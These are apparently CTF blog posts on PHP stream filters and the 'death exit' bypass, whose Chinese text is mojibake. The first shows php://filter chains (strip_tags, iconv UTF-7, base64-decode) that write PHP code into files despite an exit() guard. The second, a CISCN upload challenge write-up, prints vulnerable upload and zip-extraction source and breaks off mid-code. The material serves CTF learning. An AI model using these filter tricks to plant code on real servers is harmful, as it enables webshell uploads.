<h2 id="å­—ç¬¦ä¸²è¿‡æ»¤å™¨"><a href="#å­—ç¬¦ä¸²è¿‡æ»¤å™¨" class="headerlink" title="å­—ç¬¦ä¸²è¿‡æ»¤å™¨"></a>å­—ç¬¦ä¸²è¿‡æ»¤å™¨</h2><h3 id="string-rot13"><a href="#string-rot13" class="headerlink" title="string.rot13"></a>string.rot13</h3><p>å®˜æ–¹çš„ä¾‹å­ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fp = fopen(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">stream_filter_append($fp, <span class="string">&#x27;string.rot13&#x27;</span>);</span><br><span class="line">fwrite($fp, <span class="string">&quot;This is a test.\n&quot;</span>);</span><br><span class="line"><span class="comment">/* Outputs:  Guvf vf n grfg.   */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ–¹ä¾¿æµ‹è¯•å†™æˆï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="number">0</span>];</span><br><span class="line">$fp = fopen($a, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite($fp, <span class="string">&quot;This is a test.\n&quot;</span>);</span><br><span class="line"><span class="comment">/* Outputs:  Guvf vf n grfg.   */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>å¯ä»¥å°±è¿™æ ·å†™ä½œï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;5.php?0&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;1.php</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å†™å…¥çš„æ–‡ä»¶å°±ä¼šè¢«ç”¨base64çš„æ–¹å¼åŠ å¯†ã€‚</p>
<h3 id="string-toupper"><a href="#string-toupper" class="headerlink" title="string.toupper"></a>string.toupper</h3><p><code>string.toupper</code>ï¼ˆè‡ª PHP 5.0.0 èµ·ï¼‰ä½¿ç”¨æ­¤è¿‡æ»¤å™¨ç­‰åŒäºç”¨ <a href="https://www.php.net/manual/zh/function.strtoupper.php">strtoupper()</a>å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚</p>
<p>å¤§å†™å†™å…¥çš„å†…å®¹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;5.php?0&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.toupper&#x2F;resource&#x3D;1.php</span><br></pre></td></tr></table></figure>

<p><img src="image-20210516205945077.png" alt="image-20210516205945077"></p>
<h3 id="string-tolower"><a href="#string-tolower" class="headerlink" title="string.tolower"></a>string.tolower</h3><p><code>string.tolower</code>ï¼ˆè‡ª PHP 5.0.0 èµ·ï¼‰ä½¿ç”¨æ­¤è¿‡æ»¤å™¨ç­‰åŒäºç”¨ <a href="https://www.php.net/manual/zh/function.strtolower.php">strtolower()</a>å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®</p>
<p>åŒæ ·ï¼Œå°å†™å†™å…¥çš„å†…å®¹</p>
<p>å®˜æ–¹å•ç‹¬åˆ—å‡ºæ¥çš„ä¸€ä¸ªè¿‡æ»¤å™¨ï¼š</p>
<h3 id="string-strip-tags"><a href="#string-strip-tags" class="headerlink" title="string.strip_tags"></a>string.strip_tags</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">ä½¿ç”¨æ­¤è¿‡æ»¤å™¨ç­‰åŒäºç”¨ strip_tags()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚å¯ä»¥ç”¨ä¸¤ç§æ ¼å¼æ¥æ”¶å‚æ•°ï¼šä¸€ç§æ˜¯å’Œ strip_tags()å‡½æ•°ç¬¬äºŒä¸ªå‚æ•°ç›¸ä¼¼çš„ä¸€ä¸ªåŒ…å«æœ‰æ ‡è®°åˆ—è¡¨çš„å­—ç¬¦ä¸²ï¼Œä¸€ç§æ˜¯ä¸€ä¸ªåŒ…å«æœ‰æ ‡è®°åçš„æ•°ç»„ã€‚</span><br><span class="line"></span><br><span class="line">è­¦å‘Š</span><br><span class="line">æœ¬ç‰¹æ€§å·²è‡ª PHP 7.3.0 èµ·åºŸå¼ƒã€‚å¼ºçƒˆå»ºè®®ä¸è¦ä½¿ç”¨æœ¬ç‰¹æ€§ã€‚</span><br></pre></td></tr></table></figure>

<p>ä¾‹å¦‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="number">0</span>];</span><br><span class="line">$fp = fopen($a, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite($fp, <span class="string">&quot;&lt;g1&gt;This&lt;h1&gt; is&lt;/h1&gt; a test.&lt;/g1&gt;\n&quot;</span>);</span><br><span class="line"><span class="comment">/* This is a test   */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°çš„ç»“æœæ˜¯æ‰€æœ‰çš„xmlçš„æ ‡ç­¾éƒ½è¢«åˆ æ‰äº†ã€‚å¦‚æœæ˜¯å°šæœªé—­åˆçš„æ ‡ç­¾ï¼ŒåŒæ ·çš„ä¼šå°†å…¶åˆ é™¤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="number">0</span>];</span><br><span class="line">$fp = fopen($a, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite($fp, <span class="string">&quot;&lt;?php 123123123?&gt;\n&quot;</span>);</span><br><span class="line"><span class="comment">/* Outputs:  å…¨éƒ¨è¢«åˆ é™¤   */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å¦‚æœå°†fwriteæ„é€ ä¸ºï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fwrite($fp, <span class="string">&quot;&lt;?php 123123123?&gt; asdasdasdasd\n&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°çš„ç»“æœä¾¿ä¼šæ˜¯ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">asdasdasdasd</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥é¢˜ç›®å¦‚æœå…è®¸æˆ‘ä»¬æ§åˆ¶å†™å…¥å†…å®¹çš„è¯ï¼Œå°±å¯ä»¥å°è¯•é—­åˆå‰é¢çš„æ ‡ç­¾ï¼Œå°±å¯ä»¥åˆ é™¤æ‰é¢˜ç›®å¯ä»¥è®¾ç½®çš„ä»£ç äº†ã€‚</p>
<p>ä½†æ˜¯è¯¥æ ‡ç­¾åˆä¼šé‡è§ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æˆ‘ä»¬å†™å…¥çš„å†…å®¹ä¹Ÿä¼šè¢«ä»–åˆ é™¤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fwrite($fp, <span class="string">&quot;&lt;?php 123123123?&gt; &lt;?php phpinfo(); \n&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>å¥½åœ¨phpæ˜¯å…è®¸åŒæ—¶åˆ©ç”¨å¤šä¸ªåè®®æµçš„ã€‚å¹¶ä¸”PHPçš„åè®®æµé¡ºåºä¸ºï¼š</p>
<ul>
<li>ç”¨Aåè®®æµå¤„ç†ä¸€è¾¹æ–‡ä»¶</li>
<li>å†ç”¨Båè®®æµå¤„ç†ä¸€è¾¹æ–‡ä»¶</li>
</ul>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†æˆ‘ä»¬çš„å†…å®¹ç»„åˆä¸º ?&gt; ç„¶ååœ¨base64è§£å¯†.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/5.php?0=php://filter/string.strip_tags|convert.base64-decode/resource=1.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="number">0</span>];</span><br><span class="line">$fp = fopen($a, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite($fp, <span class="string">&quot;&lt;?php 123123123?&gt; Cjw/cGhwIHBocGluZm8oKTs=\n&quot;</span>);</span><br><span class="line"><span class="comment">/* Outputs:  Guvf vf n grfg.   */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">   </span><br></pre></td></tr></table></figure>



<h2 id="è½¬æ¢è¿‡æ»¤å™¨"><a href="#è½¬æ¢è¿‡æ»¤å™¨" class="headerlink" title="è½¬æ¢è¿‡æ»¤å™¨"></a>è½¬æ¢è¿‡æ»¤å™¨</h2><p>å®˜æ–¹è§£é‡Šï¼š</p>
<p>å¦‚åŒ string.* è¿‡æ»¤å™¨ï¼Œconvert.* è¿‡æ»¤å™¨çš„ä½œç”¨å°±å’Œå…¶åå­—ä¸€æ ·ã€‚è½¬æ¢è¿‡æ»¤å™¨æ˜¯ PHP 5.0.0 æ·»åŠ çš„ã€‚å¯¹äºæŒ‡å®šè¿‡æ»¤å™¨çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è€ƒè¯¥å‡½æ•°çš„æ‰‹å†Œé¡µã€‚</p>
<p><code>convert.base64-encode</code>å’Œ <code>convert.base64-decode</code>ä½¿ç”¨è¿™ä¸¤ä¸ªè¿‡æ»¤å™¨ç­‰åŒäºåˆ†åˆ«ç”¨ <a href="https://www.php.net/manual/zh/function.base64-encode.php">base64_encode()</a>å’Œ <a href="https://www.php.net/manual/zh/function.base64-decode.php">base64_decode()</a>å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚ <code>convert.base64-encode</code>æ”¯æŒä»¥ä¸€ä¸ªå…³è”æ•°ç»„ç»™å‡ºçš„å‚æ•°ã€‚å¦‚æœç»™å‡ºäº† <code>line-length</code>ï¼Œbase64 è¾“å‡ºå°†è¢«ç”¨ <code>line-length</code>ä¸ªå­—ç¬¦ä¸º é•¿åº¦è€Œæˆªæˆå—ã€‚å¦‚æœç»™å‡ºäº† <code>line-break-chars</code>ï¼Œæ¯å—å°†è¢«ç”¨ç»™å‡ºçš„å­—ç¬¦éš”å¼€ã€‚è¿™äº›å‚æ•°çš„æ•ˆæœå’Œç”¨ <a href="https://www.php.net/manual/zh/function.base64-encode.php">base64_encode()</a>å†åŠ ä¸Š <a href="https://www.php.net/manual/zh/function.chunk-split.php">chunk_split()</a>ç›¸åŒã€‚</p>
<h3 id="convert-base64-encode-decode"><a href="#convert-base64-encode-decode" class="headerlink" title="convert.base64-encode/decode"></a>convert.base64-encode/decode</h3><p>è¿™ä¸ªå¤§å®¶éƒ½å¾ˆç†Ÿäº†å°±ä¸å¤šè¯´äº†ã€‚</p>
<h3 id="convert-quoted-printable-encode-amp-convert-quoted-printable-decode"><a href="#convert-quoted-printable-encode-amp-convert-quoted-printable-decode" class="headerlink" title="convert.quoted-printable-encode &amp; convert.quoted-printable-decode"></a>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</h3><p>å®˜æ–¹çš„è§£é‡Šï¼š</p>
<p><code>convert.quoted-printable-encode</code>å’Œ <code>convert.quoted-printable-decode</code>ä½¿ç”¨æ­¤è¿‡æ»¤å™¨çš„ decode ç‰ˆæœ¬ç­‰åŒäºç”¨ <a href="https://www.php.net/manual/zh/function.quoted-printable-decode.php">quoted_printable_decode()</a>å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚æ²¡æœ‰å’Œ <code>convert.quoted-printable-encode</code>ç›¸å¯¹åº”çš„å‡½æ•°ã€‚ <code>convert.quoted-printable-encode</code>æ”¯æŒä»¥ä¸€ä¸ªå…³è”æ•°ç»„ç»™å‡ºçš„å‚æ•°ã€‚é™¤äº†æ”¯æŒå’Œ <code>convert.base64-encode</code>ä¸€æ ·çš„é™„åŠ å‚æ•°å¤–ï¼Œ <code>convert.quoted-printable-encode</code>è¿˜æ”¯æŒå¸ƒå°”å‚æ•° <code>binary</code>å’Œ <code>force-encode-first</code>ã€‚ <code>convert.base64-decode</code>åªæ”¯æŒ <code>line-break-chars</code>å‚æ•°ä½œä¸ºä»ç¼–ç è½½è·ä¸­å‰¥ç¦»çš„ç±»å‹æç¤ºã€‚</p>
<p>æ„Ÿè§‰å¥½å¤æ‚ã€‚ã€‚ä½†æ˜¯ä¸»è¦æ˜¯ç¬¬äºŒè¡Œï¼Œç­‰ä»·äºquoted_printable_decodeå‡½æ•°ï¼Œè¯¥å‡½æ•°çš„ä½œå°† quoted-printable å­—ç¬¦ä¸²è½¬æ¢ä¸º 8-bit å­—ç¬¦ä¸²</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fp = fopen(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">stream_filter_append($fp, <span class="string">&#x27;convert.quoted-printable-encode&#x27;</span>);</span><br><span class="line">fwrite($fp, <span class="string">&quot;This is a test.\n&quot;</span>);</span><br><span class="line"><span class="comment">/* Outputs:  =This is a test.=0A  */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ¬¸ï¼Œè¿™å°±å¾ˆè¿·æƒ‘äº†ï¼Œå•¥å‡ æŠŠæ˜¯8-bit å­—ç¬¦ä¸²ï¼Ÿ</p>
<p>å®˜æ–¹ä¸¢äº†ä¸ªurlç»™æˆ‘ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.faqs.org&#x2F;rfcs&#x2F;rfc2045.html</span><br></pre></td></tr></table></figure>

<p>æ¬¸ï¼Œè¿™å°±å¾ˆéš¾è¿‡äº†ï¼Œæˆ‘çœ‹ä¸æ‡‚è¯¥å’‹åŠå•Šï¼Ÿï¼Œä½†æ˜¯æ„Ÿè§‰å¯¹äºåšé¢˜æ¥è¯´æœ‰ç‚¹é¸¡è‚‹ï¼Œæš‚æ—¶å…ˆçŸ¥è¯†æ”¾åœ¨è¿™é‡Œï¼ˆå¸Œæœ›ä¸è¦å“ªå¤©åˆ«äººæ‚Ÿäº†å‡ºé¢˜åšä¸å‡ºæ¥æŒ¨æ‰“å‘œå‘œï¼‰</p>
<h3 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv.*"></a>convert.iconv.*</h3><p>å‘ƒã€‚è¿™ä¸ªè¿‡æ»¤å™¨æ˜¯è¢«å®˜æ–¹è—èµ·æ¥äº†ï¼Œåªæœ‰è‹±æ–‡çš„åŸç‰ˆæ‰‹å†Œæ‰å¯ä»¥çœ‹è§ï¼ˆæ€ªä¸å¾—è§æœ‰é¢˜ç›®å‡ºè¿‡ï¼‰</p>
<p>è¯¥<code>convert.iconv.*</code>è¿‡æ»¤å™¨æ˜¯å¯ç”¨çš„ï¼Œå¦‚æœ <a href="https://www.php.net/manual/en/book.iconv.php">çš„iconv</a>æ”¯æŒå¯ç”¨ï¼Œå¹¶ä¸”å®ƒä»¬çš„ä½¿ç”¨æ˜¯ç­‰åŒäºå¤„ç†æ‰€æœ‰çš„æµæ•°æ®<a href="https://www.php.net/manual/en/function.iconv.php">çš„iconvï¼ˆï¼‰ </a>ã€‚è¿™äº›è¿‡æ»¤å™¨ä¸æ”¯æŒå‚æ•°ï¼Œè€Œæ˜¯æœŸæœ›è¾“å…¥å’Œè¾“å‡ºç¼–ç ä½œä¸ºè¿‡æ»¤å™¨åç§°çš„ä¸€éƒ¨åˆ†ç»™å‡ºï¼Œå³as <code>convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;</code>æˆ– <code>convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</code> ï¼ˆè¿™ä¸¤ä¸ªç¬¦å·åœ¨è¯­ä¹‰ä¸Šæ˜¯ç­‰æ•ˆçš„ï¼‰ã€‚</p>
<p>ç”¨æ³•ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fp = fopen(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">stream_filter_append($fp, <span class="string">&#x27;convert.iconv.utf-16le.utf-8&#x27;</span>);</span><br><span class="line">fwrite($fp, <span class="string">&quot;T\0h\0i\0s\0 \0i\0s\0 \0a\0 \0t\0e\0s\0t\0.\0\n\0&quot;</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"><span class="comment">/* Outputs: This is a test. */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ¬¸ï¼Œæœ‰è¿™ä¸ªå°±å¾ˆæ–¹ä¾¿ï¼Œå®ƒå…è®¸æˆ‘ä»¬å°†å°†å†…å®¹ä»A-&gt;è½¬æ¢åˆ°Bï¼Œè¿™æ ·çš„è¯å°±å¾ˆèˆ’æœï¼Œå› ä¸ºä»–ä¼šé€ æˆé¢˜ç›®è®¾ç½®çš„éšœç¢ä»£ç å¤±æ•ˆï¼Œæ¯”å¦‚æœ‰è¿™ç§æƒ…å†µï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="number">0</span>];</span><br><span class="line">$fp = fopen($a, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite($fp, <span class="string">&quot;&lt;?php exit(); /* å¯æ§å†…å®¹  */ \n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>æ„é€ urlå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;5.php?0&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7&#x2F;resource&#x3D;1.php</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°ç»“æœï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+ADw?php exit()+ADs </span><br></pre></td></tr></table></figure>

<p>æ¬¸ï¼Œè¿™æ—¶å€™å°±æœ‰äººå¯èƒ½è¦é—®äº†ï¼Œå¯æ˜¯æˆ‘ä¹Ÿä¸æ‡‚utf-7å•Šï¼Ÿå…¶å®è¿™ä¹Ÿå¾ˆç®€å•ï¼Œä¸æ‡‚æ²¡äº‹ï¼Œåœ¨æœ¬æœºä¸Šå…ˆå°†æƒ³è¦çš„å†…å®¹æ“ä½œä¸€ä¸‹å°±å¥½äº†ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="number">0</span>];</span><br><span class="line">$fp = fopen($a, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite($fp, <span class="string">&quot;&lt;?php phpinfo(); \n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">+ADw?php phpinfo()+ADs </span><br></pre></td></tr></table></figure>

<p>æ¬¸ï¼Œè¿™æ˜¯åˆé‡è§äº†ä¸€ä¸ªé—®é¢˜ï¼Œè¿™ä¸ªæµå¥½åƒåªèƒ½åŠ å¯†ï¼Œæ²¡åŠæ³•è§£å¯†å•Šï¼Œè¿™æ ·å¯¼è‡´äº†ä¸€ä¸ªå¾ˆå°´å°¬çš„é—®é¢˜ï¼Œå¦‚æœæˆ‘ä»¬å°è¯•è¾“å…¥ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fwrite($fp, <span class="string">&quot;&lt;?php exit(); +ADw?php phpinfo()+ADs \n&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>è¢«è½¬æ¢ä¹‹åçš„ç»“æœå¹¶éæˆ‘ä»¬æ‰€è®¾æƒ³çš„è½¬æ¢å›å»ï¼Œè€Œæ˜¯ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">+ADw?php <span class="keyword">exit</span>()+ADs +-ADw?php phpinfo()+-ADs </span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¿™ä¾ç„¶ä¸å¤±ä¸ºä¸€ç§æ˜¯å°†æ­»äº¡exitåˆ æ‰çš„å¥½æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥åŒæ ·çš„åˆ©ç”¨base64æµç­‰ç­‰æ“ä½œæŠŠä»–è½¬æ¢ä¸€å“ˆ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;5.php?0&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7|convert.base64-decode&#x2F;resource&#x3D;1.php</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="number">0</span>];</span><br><span class="line">$fp = fopen($a, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite($fp, <span class="string">&quot;&lt;?php exit();aCjw/cGhwIHBocGluZm8oKTs= \n&quot;</span>);</span><br><span class="line"><span class="comment">// è¿™é‡Œçš„aå°±æ˜¯ç”¨äºå¡«å……8å­—èŠ‚çš„</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸€ä¸ªæä¾›å„ç§å­—èŠ‚ç¼–ç çš„ç½‘ç«™ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.compart.com&#x2F;en&#x2F;unicode&#x2F;</span><br></pre></td></tr></table></figure>



<p>çªç„¶åˆçœ‹åˆ°è¿™ä¸ª</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;KSroido&#x2F;article&#x2F;details&#x2F;109656236</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;USTC-Hackergame&#x2F;hackergame2020-writeups</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCNUPLOAD</title>
    <url>/2021/05/19/CISCNUPLOAD/</url>
    <content><![CDATA[<h1 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h1><ul>
<li>upload</li>
<li>å­—ç¬¦ä¸²ç¼–ç é—®é¢˜</li>
<li>ä»£ç å®¡è®¡ï¼ˆï¼Ÿå¤§æ¦‚ä¹Ÿæ²¡æœ‰ï¼‰</li>
<li>mb_strtolower ç»•è¿‡</li>
</ul>
<h1 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h1><p>é¢˜ç›®ä¸€å…±ç»™å‡ºindex.php å’Œexample.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&quot;ctf&quot;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&quot;ctf&quot;</span>]))</span><br><span class="line">    $ctf = $_GET[<span class="string">&quot;ctf&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($ctf==<span class="string">&quot;upload&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_FILES[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>*<span class="number">512</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¿™ä¹ˆå¤§ä¸ªçš„ä¸œè¥¿ä½ æ˜¯æƒ³dæˆ‘å—ï¼Ÿ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $imageinfo = getimagesize($_FILES[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($imageinfo === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¦‚æœä¸èƒ½å¥½å¥½ä¼ å›¾ç‰‡çš„è¯å°±è¿˜æ˜¯ä¸è¦æ¥æ‰“æ‰°æˆ‘äº†&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($imageinfo[<span class="number">0</span>] !== <span class="number">1</span> &amp;&amp; $imageinfo[<span class="number">1</span>] !== <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;ä¸œè¥¿ä¸èƒ½æ–¹æ–¹æ­£æ­£çš„è¯å°±å¾ˆè®¨åŒ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $fileName=urldecode($_FILES[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(stristr($fileName,<span class="string">&quot;c&quot;</span>) || stristr($fileName,<span class="string">&quot;i&quot;</span>) || stristr($fileName,<span class="string">&quot;h&quot;</span>) || stristr($fileName,<span class="string">&quot;ph&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;æœ‰äº›ä¸œè¥¿è®©ä½ ä¼ ä¸Šå»çš„è¯é‚£å¯ä¸å¾—äº†&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $imagePath = <span class="string">&quot;image/&quot;</span> . mb_strtolower($fileName);</span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">&quot;postedFile&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], $imagePath)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;upload success, image at <span class="subst">$imagePath</span>&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;ä¼ éƒ½æ²¡æœ‰ä¼ ä¸Šå»&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>è¦æ±‚ä¸Šä¼ ä¸€ä¸ªæ­£æ–¹å½¢çš„å›¾ç‰‡ï¼Œä¸”å›¾ç‰‡åç¼€ä¸å¯ä»¥æœ‰c/i/ph/h</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&quot;ctf&quot;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&quot;ctf&quot;</span>]))</span><br><span class="line">    $ctf = $_GET[<span class="string">&quot;ctf&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($ctf==<span class="string">&quot;poc&quot;</span>) &#123;</span><br><span class="line">    $zip = <span class="keyword">new</span> \ZipArchive();</span><br><span class="line">    $name_for_zip = <span class="string">&quot;example/&quot;</span> . $_POST[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(explode(<span class="string">&quot;.&quot;</span>,$name_for_zip)[count(explode(<span class="string">&quot;.&quot;</span>,$name_for_zip))<span class="number">-1</span>]!==<span class="string">&quot;zip&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¦ä¸å’±ä»¬å†çœ‹çœ‹ï¼Ÿ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($zip-&gt;open($name_for_zip) !== <span class="literal">TRUE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;éƒ½ä¸èƒ½è§£å‹å‘¢&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å¯ä»¥è§£å‹ï¼Œæˆ‘æƒ³æƒ³å­˜å“ªé‡Œ&quot;</span>;</span><br><span class="line">    $pos_for_zip = <span class="string">&quot;/tmp/example/&quot;</span> . md5($_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    $zip-&gt;extractTo($pos_for_zip);</span><br><span class="line">    $zip-&gt;close();</span><br><span class="line">    unlink($name_for_zip);</span><br><span class="line">    $files = glob(<span class="string">&quot;<span class="subst">$pos_for_zip</span>/*&quot;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file)&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_dir($file)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $first = 